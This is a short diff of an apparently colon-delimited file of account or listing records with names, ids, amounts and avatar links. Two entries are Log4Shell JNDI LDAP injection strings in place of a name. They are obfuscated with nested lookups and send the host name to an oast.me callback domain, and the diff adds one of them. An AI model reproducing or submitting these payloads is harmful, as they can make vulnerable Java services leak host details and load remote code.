@@ -10,3 +10,4 @@ Resuprivate:912935c2646:opened:ResuPrivate:975.00:https://i.postimg.cc/ydxNDxzg/
 Quantumprivate:912936c2646:opened:Quantumprivate:8890.00:https://i.postimg.cc/ydxNDxzg/avatar1933479-2.jpg:Public:15
 A681dU:ANOt4iHz:opened:::https://::
 ${jndi:ldap://${:-801}${:-712}.${hostName}.username.d5d5us9077rj4565psogdfoe513tsfjqh.oast.me/test}::opened:::https://::
+${jndi:ldap://${:-875}${:-171}.${hostName}.username.d5d5us9077rj4565psogqkwat98eq347z.oast.me/test}::opened:::https://::
